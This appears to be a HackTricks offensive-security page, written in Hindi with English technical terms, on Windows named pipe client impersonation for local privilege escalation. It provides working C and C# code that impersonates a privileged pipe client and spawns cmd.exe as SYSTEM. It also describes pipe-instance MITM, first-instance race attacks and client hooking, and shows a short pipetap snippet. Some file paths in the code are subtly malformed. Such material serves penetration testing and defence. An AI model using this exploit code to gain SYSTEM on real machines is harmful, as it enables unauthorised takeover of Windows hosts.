# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe Client Impersonation एक local privilege escalation primitive है, जो named-pipe server thread को उससे connect होने वाले client के security context को अपनाने की अनुमति देता है। व्यवहार में, ऐसा attacker जो SeImpersonatePrivilege के साथ code चला सकता है, किसी privileged client (जैसे SYSTEM service) को attacker-controlled pipe से connect करने के लिए बाध्य कर सकता है, ImpersonateNamedPipeClient call कर सकता है, resulting token को primary token में duplicate कर सकता है, और client के रूप में process spawn कर सकता है (अक्सर NT AUTHORITY\SYSTEM)।<sup>[[2]](#references)</sup>

यह page core technique पर केंद्रित है। ऐसे end-to-end exploit chains के लिए, जो SYSTEM को आपके pipe से connect कराती हैं, नीचे referenced Potato family pages देखें।

## TL;DR
- एक named pipe बनाएँ: \\.\pipe\<random> और connection की प्रतीक्षा करें।
- किसी privileged component को इससे connect कराएँ (spooler/DCOM/EFSRPC/etc.)।
- pipe से कम-से-कम एक message read करें, फिर ImpersonateNamedPipeClient call करें।
- current thread से impersonation token open करें, DuplicateTokenEx(TokenPrimary) करें, और SYSTEM process प्राप्त करने के लिए CreateProcessWithTokenW/CreateProcessAsUser चलाएँ।<sup>[[2]](#references)</sup>

## Requirements and key APIs
- calling process/thread को सामान्यतः आवश्यक privileges:
- connecting client को successfully impersonate करने और CreateProcessWithTokenW का उपयोग करने के लिए SeImpersonatePrivilege।
- वैकल्पिक रूप से, SYSTEM को impersonate करने के बाद आप CreateProcessAsUser का उपयोग कर सकते हैं, जिसके लिए SeAssignPrimaryTokenPrivilege और SeIncreaseQuotaPrivilege की आवश्यकता हो सकती है (जब आप SYSTEM को impersonate कर रहे हों, तब ये satisfied होते हैं)।
- उपयोग की जाने वाली core APIs:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation से पहले कम-से-कम एक message read करना आवश्यक है)
- ImpersonateNamedPipeClient और RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW या CreateProcessAsUser
- Impersonation level: locally useful actions करने के लिए, client को SecurityImpersonation allow करना आवश्यक है (कई local RPC/named-pipe clients के लिए default)। pipe खोलते समय clients इसे SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION के साथ lower कर सकते हैं।<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
नोट्स:
- यदि ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) लौटाता है, तो सुनिश्चित करें कि आपने पहले pipe से read किया हो और client ने impersonation को Identification level तक सीमित न किया हो।
- process creation के लिए उपयुक्त primary token बनाने हेतु SecurityImpersonation और TokenPrimary के साथ DuplicateTokenEx का उपयोग करना बेहतर है।

## .NET का त्वरित उदाहरण
.NET में, NamedPipeServerStream RunAsClient के माध्यम से impersonate कर सकता है। Impersonate करने के बाद, thread token को duplicate करें और एक process बनाएं।
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM को आपके pipe से connect कराने के लिए Common triggers/coercions
ये techniques privileged services को आपके named pipe से connect करने के लिए coerce करती हैं, ताकि आप उनका impersonate कर सकें:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Detailed usage और compatibility यहाँ देखें:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

यदि आपको service trigger से SYSTEM spawn करने के लिए pipe बनाने और impersonate करने का पूरा example चाहिए, तो देखें:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

जब कोई privileged service और low-privileged process `\\.\pipe\...` के माध्यम से communicate करते हैं, तो pipe को किसी भी अन्य untrusted IPC boundary की तरह treat करें। Classic server-side impersonation के अलावा, weak pipe ACLs, unsafe creation flags और client-side trust decisions भी local privilege escalation primitives बन सकते हैं।<sup>[[7]](#references)</sup>

### पहले candidate pipes enumerate करें
- PowerShell से pipes जल्दी list करें: `Get-ChildItem \\.\pipe\`
- Sysinternals का `pipelist64.exe` instance counts और single-instance pipes पहचानने के लिए उपयोगी है।
- उन names को प्राथमिकता दें जिन्हें `SYSTEM` के रूप में चलने वाली services उपयोग करती हैं, विशेषकर helpers, updaters, launchers और UI brokers।

### Permissive DACLs और extra pipe instances के माध्यम से MITM
- Privileged server से communicate कर सकने वाला कोई भी process पहले से उसके protocol को fuzz कर सकता है और privileged verbs खोज सकता है।<sup>[[7]](#references)</sup>
- अधिक interesting स्थिति तब होती है जब DACL pipe object पर `FILE_GENERIC_WRITE`/`GENERIC_WRITE` grant करता है। Named pipes पर इसमें implicitly `FILE_CREATE_PIPE_INSTANCE` शामिल होता है (`FILE_APPEND_DATA` भी यही bit share करता है), इसलिए attacker उसी name के साथ एक और server instance create कर सकता है।
- क्योंकि instances FIFO order में match होते हैं, attacker-created और legitimate instances interleave हो सकते हैं: `CreateNamedPipe` से एक rogue instance create करें, फिर `CreateFile` से उसी pipe name को open करें और किसी real client के rogue server instance पर आने की प्रतीक्षा करें।
- परिणाम: original server process को own किए बिना privileged IPC को observe, modify, relay या desynchronize किया जा सकता है।

### Pipe security descriptors पर First-instance race
- `lpSecurityAttributes` केवल तभी DACL define करता है जब किसी pipe name का first instance create किया जाता है।<sup>[[4]](#references)[[7]](#references)</sup>
- यदि कोई privileged service देर से start होती है और `FILE_FLAG_FIRST_PIPE_INSTANCE` का उपयोग नहीं करती, तो attacker permissive DACL के साथ pipe name को पहले create कर सकता है, फिर service को attacker-chosen security context के अंतर्गत बाद के instances create करने दे सकता है।
- इससे service startup एक race condition बन जाता है: first instance जीतें, फिर weakened ACL का उपयोग करके बाद के clients से connect या MITM करें।
- Defenders के लिए mitigation और attackers के लिए key review point: जाँचें कि `CreateNamedPipe(..., dwOpenMode, ...)` में `FILE_FLAG_FIRST_PIPE_INSTANCE` शामिल है या नहीं। यदि नहीं है, तो service start होने से पहले pre-creation test करें।

### PID/signature checks hardening हैं, boundary नहीं
- कुछ products connecting client को `GetNamedPipeClientProcessId`, process image path या Authenticode signer check करके access restrict करने का प्रयास करते हैं।<sup>[[7]](#references)</sup>
- यह केवल तब तक मदद करता है जब तक आप legitimate client में inject नहीं करते: trusted process के अंदर पहुँचने के बाद आपको वही exact PID/image/signature context मिल जाता है जिसकी server अपेक्षा करता है।
- Split desktop apps के लिए low-privileged UI/helper process को instrument करना अक्सर `SYSTEM` service पर सीधे attack करने से आसान होता है।

### Client के I/O model के अनुसार उसे hook करें
- Synchronous I/O: syscall द्वारा buffer consume किए जाने से पहले `NtWriteFile` intercept करें और उसके return होने के बाद `NtReadFile` को inspect/patch करें।<sup>[[7]](#references)</sup>
- Overlapped I/O: `NtReadFile` में दिखाई देने वाले `OVERLAPPED`/`IoStatusBlock` को store करें, फिर `GetOverlappedResult` या relevant wait पूरा होने के बाद buffer inspect करें।
- Completion ports: `GetQueuedCompletionStatus`, `NtRemoveIoCompletion` तक पहुँचता है; returned `ApcContext`, original read में उपयोग किए गए `OVERLAPPED` से link करता है, जो अब-populated buffer खोजने के लिए सही pivot है।
- Completion routines (`ReadFileEx`): completion callback एक APC के रूप में deliver किया जाता है। यदि returned data के साथ tamper करना या synthetic replies inject करना हो, तो real completion routine को hook करें और custom injection के लिए one-argument `QueueUserAPC` dispatcher उपयोग करें, जो routine के अपेक्षित 3 arguments को reconstruct करे।<sup>[[5]](#references)[[7]](#references)</sup>

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) injected helper DLL के माध्यम से named-pipe traffic को proxy करता है और editing/replay के लिए Burp-like workflow देता है।<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) Frida-based approach अपनाता है और ऊपर बताए गए `NtReadFile`/`NtWriteFile` तथा async/completion pivots को hook करने पर focus करता है, फिर traffic को WebSocket-backed editing workflow पर forward करता है।<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational considerations
- Named pipes low-latency होते हैं; buffers को edit करते समय लंबे pauses brittle services को deadlock कर सकते हैं।<sup>[[7]](#references)</sup>
- Overlapped/completion-port/APC-driven clients को simple `ReadFile`/`WriteFile` detours से अलग hooks की आवश्यकता होती है।
- Trusted client में Injection noisy होता है और सामान्यतः इसे exploit development, protocol reversing या local lab fuzzing तक सीमित रखना बेहतर है।

## Troubleshooting and gotchas
- `ImpersonateNamedPipeClient` call करने से पहले आपको pipe से कम-से-कम एक message पढ़ना होगा; अन्यथा आपको ERROR_CANNOT_IMPERSONATE (1368) मिलेगा।<sup>[[1]](#references)</sup>
- यदि client `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION` के साथ connect करता है, तो server पूरी तरह impersonate नहीं कर सकता; `GetTokenInformation(TokenImpersonationLevel)` के माध्यम से token का impersonation level जाँचें।<sup>[[3]](#references)</sup>
- `CreateProcessWithTokenW` को caller पर SeImpersonatePrivilege की आवश्यकता होती है। यदि यह ERROR_PRIVILEGE_NOT_HELD (1314) के साथ fail हो, तो SYSTEM को पहले से impersonate करने के बाद `CreateProcessAsUser` का उपयोग करें।
- यदि आप अपनी pipe को harden करते हैं, तो सुनिश्चित करें कि उसका security descriptor target service को connect करने की अनुमति देता है; default रूप से, `\\.\pipe` के अंतर्गत pipes server के DACL के अनुसार accessible होती हैं।<sup>[[3]](#references)</sup>

## References

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
